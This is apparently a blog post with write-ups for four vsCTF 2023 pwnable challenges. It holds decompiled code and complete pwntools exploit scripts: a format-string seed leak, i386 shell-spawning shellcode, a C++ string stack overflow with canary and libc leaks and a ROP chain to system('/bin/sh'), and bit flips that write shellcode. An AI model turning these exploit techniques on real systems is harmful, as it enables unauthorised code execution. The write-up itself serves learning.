---
layout: post
title: "vsCTF 2023 Pwnable Write up"
date: 2023-09-25 02:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
media_subpath: /assets/img/20230925_vsctf_write-up
image: 0.jpg
---

## **RPS**

---

### **[0x00] Description**

> Just a classic game of Rambunctious Parchment Snippers.
> 
> Author: Rench
> 
> 77 solves

### **[0x01] Summary**

After obtaining the seed of the srand through FSB, predict the value of rand.

### **[0x02] Solutions**

```c
int main() {
  setbuf(_bss_start, 0LL);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    printf("Opening /dev/urandom failed");
    exit(1);
  }

  read(fd, &seed, 4uLL);
  close(fd);
  srand(seed);
  printf("Enter your name: ");
  fgets(s, 0x14, stdin);
  printf("Hi ");
  printf(s);                                    // <--- FSB
  puts("Let's play some Rock Paper Scissors!");
  puts("If you beat me 50 times in a row I'll give you a special prize.");
  for ( i = 0; i <= 49; ++i )
  {
    if ( (unsigned __int8)rps() != 1 )
    {
      puts("You didn't beat me enough times. Too bad!");
      exit(1);
    }
  }
  win();
  return 0;
}
```

It uses a random seed through `/dev/urandom`, but we can leak the seed. The code is vulnerable for FSB. After then, using ctypes module in python, we can imitate the return value of `rand` function of server.

`rps` is just a function that checks whether the user's input is correct or not based on the return value of `rand`.

```py
from pwn import *
from ctypes import *

def getAnswer():
    choice = 'rps'
    return choice[(r.rand() + 1) % 3].encode()

r = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
if args.REMOTE:
    p = remote('vsc.tf', 3094)
else:
    p = process('./rps', aslr=0)
payload = b'%9$p'
p.sendlineafter(b": ", payload)
rand = int(p.recvline()[3:], 16) & 0xFFFFFFFF
log.success(f"rand @ {hex(rand)}")

r.srand(rand)
for _ in range(50):
    p.sendlineafter(b": ", getAnswer())

p.interactive()
```

`vsctf{Wh4t_da_h3ck_br0_gu355_g0d_kn0ws_4ll_my_m0v3s_:(((}`

## **Tiny-Pwn**

---

### **[0x00] Description**

> Recently the GOAT unvariant taught me how to ELF golf. I was so proud of what I made I wanted to show the whole world. But go easy on him... he's just a child.
> 
> Author: Rench
> 
> 71 solves

### **[0x01] Summary**

Shell coding in code-golfed (very short) i386 binary

### **[0x02] Solutions**

```bash
$ gdb tinypwn -q
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
"/home/brwook/ctf/29_vsCTF/tinypwn/tinypwn": not in executable format: file format not recognized
------- tip of the day (disable with set show-tips off) -------
Use the context (or ctx) command to display the context once again. You can reconfigure the context layout with set context-section <sections> or forward the output to a file/tty via set context-output <file>. See also config context to configure it further!
pwndbg> r
Starting program:  
No executable file specified.
Use the "file" or "exec-file" command.
```

the binary is odd and it has not correct format of elf maybe. But, you can attach the process of `tinypwn` when the process is waiting input. Through this, you can figure it out that the binary has not NX bit and your input gonna be executed!

```py
from pwn import *

context(arch='i386', os='linux')
code1 = asm('''
    xor al, al
    add al, 3
    add dx, 0x1000
    int 0x80
''')

code2 = asm(shellcraft.sh())

p = remote('vsc.tf', 3026)
p.send(code1)
p.send(b'A' * 0xB + code2)
p.interactive()
```

`vsctf{ELF_g0lf_sh3llc0d3_g0lf_4ll_th15_g0lf1ng_hurt5_my_h34d}`


## **LLM Wrapper**

---

### **[0x00] Descriptions**

> Wow I found this cool LLM wrapper for my new API! It's still in development but they're all the hype now so I'm sure that's fine.
>
> ZeroDayTea
>
> 13 solves
 
### **[0x01] Summary**

alloc a C++ basic_string less than 16 bytes, and Stack BOF exploit

### **[0x02] Solutions**

Maybe I think that it's a prob which many people have never been scared of and solved by C++. The vulnerability is easy because basic_string is initialized only once and the contents is changed after that.

```c
    if ( v10 == 2 )
    {
      LLM::get_prompt[abi:cxx11]((__int64)v12, (__int64)a2);
      v6 = std::operator==<char,std::char_traits<char>,std::allocator<char>>(v12, &unk_40503E);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v12);
      if ( v6 ) // executed only once
      {
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(a1a);
        v7 = std::operator<<<std::char_traits<char>>(&std::cout, "What would you like to ask me?");
        std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
        std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, a1a);
        std::basic_ios<char,std::char_traits<char>>::clear(&unk_4081D0, 0LL);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v12, a1a);
        LLM::set_initial_prompt((__int64)a2, (__int64)v12);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v12);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(a1a);
      }
      else
      {
        LLM::update_prompt((#7 *)a2);           // similar with gets
      }
    }
```

And `LLM` struct is just two basic_string and upward is prompt, downward is LLM token. If we alloc a prompt at first less than 16 bytes, then it alloc its memory (stack), if you over 16 bytes than it uses heap. So, If we uses less than 16 bytes, we can leak libc, stack, etc. by overwriting the token from prompt. Because `LLM::update_prompt` is similar with gets. I overwrite it with srand_got (libc), environ (stack), canary, and token_addr (heap). Then ROP it.

```py
from pwn import *
choice = lambda index: p.sendlineafter(b"choice: ", str(index).encode())
def run():
    choice(1)

def update(s):
    choice(2)
    p.sendlineafter(b"?", s)

def leak(addr):
    update(b'F'*0x10 + p64(addr) + p64(8) * 2)
    run()
    p.recvuntil(b'token "')
    return u64(p.recvuntil(b'"', True)) 

token = b'A'*0x10
context(arch='amd64', os='linux')
if args.REMOTE:
    p = remote('vsc.tf', 3756)
else:
    p = process('./llm_wrapper', aslr=1)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', False)
p.sendlineafter(b": ", token)
update(b'F'*0x8)

time_got = 0x407f28
libc.address = leak(time_got) - libc.symbols['srand']
log.success(f"libc base @ {hex(libc.address)}")

stack = leak(libc.symbols['environ'])
log.success(f"stack @ {hex(stack)}")

canary_addr = stack - 0x190
token_addr_ptr = stack - 0x168

canary = leak(canary_addr)
log.success(f"canary @ {hex(canary)}")

token_addr = leak(token_addr_ptr)
log.success(f"token_addr @ {hex(token_addr)}")

rop = ROP(libc)
pop_rdi_rbp = rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])[0]
payload = b'F'*0x10 + p64(token_addr) + p64(8) * 2 + p64(0) + b'F'*8 + p64(canary) + b'A'*0x18
payload += p64(pop_rdi_rbp) + p64(next(libc.search(b'/bin/sh'))) + p64(0)
payload += p64(libc.symbols['system'])

update(payload)
pause()
choice(3)

p.interactive()
```

`vsctf{4n_llm_d3f1nit3ly_wr0t3_th@t_c0d3}`

## **Cosmic Ray v2**

*I couldn't solve it within the competition time, but I solve it additionally for learning.*

---

### **[0x00] Descriptions**

> WOOOOO IT’S BACK AND BETTER THAN EVER!!! This time I figured I should stop letting y'all write reviews. Too many people hurt my feelings :((((
>
> Author: Rench
>
> 28 solves

### **[0x01] Summary**

make AAW using 1-bit flip to many jmp, call, ret, and etc., then shell code it

### **[0x02] Solutions**

I thought that the given binaries (`ld-2.35.so`, `libc-2.35.so`) is most important and I tried bit-flip to leave of `cosmic_ray` function (== 0x4015E8), but it failed and I gave up. But, one of the solvers has shared the write-up about bit-flip for ret of `cosmic_ray` function (== 0x4015E9). It bypass a break of stack alignment and it goes well. And, intended write-up is about canary jmp (0x4015E2, 4th bit-flip), maybe.

```py
from pwn import *

def flip(addr, index):
    p.sendlineafter(b":\n", hex(addr).encode())
    p.sendlineafter(b":\n", str(index).encode())

def flop(addr, wanted):
    print(hex(wanted))
    p.sendlineafter(b":\n", hex(addr).encode())
    p.recvuntil(b"-\n")
    cur_bin = ''.join(p.recvuntil(b"\n", True).decode().split('|'))
    bin_str = "{0:b}".format(wanted).rjust(8, '0')
    diff = []
    for i in range(8):
        if cur_bin[i] != bin_str[i]:
            diff.append(i)
    if len(diff) == 0:
        p.sendlineafter(b":\n", str(0).encode())
        flip(addr, 0)
    else:
        p.sendlineafter(b":\n", str(diff.pop(0)).encode())
        for i in diff:
            flip(addr, i)

context(arch='amd64', os='linux')
code = asm(shellcraft.sh())
if args.REMOTE:
    p = remote('vsc.tf', 3047)
else:
    p = process('./cosmicrayv2', aslr=1)

target = 0x4015E9
flip(target, 0)

start_addr = 0x401624
end_addr = start_addr + len(code)
for i in range(len(code)):
    flop(start_addr + i, code[i])

flip(target, 0)
p.interactive()
```

`vsctf{m3_wh3n_c0mp1l1ng_w1th_c4n4ry_1s_m0r3_vuln3r4bl3_th4n_c0mp1l1ng_w1th0ut}`

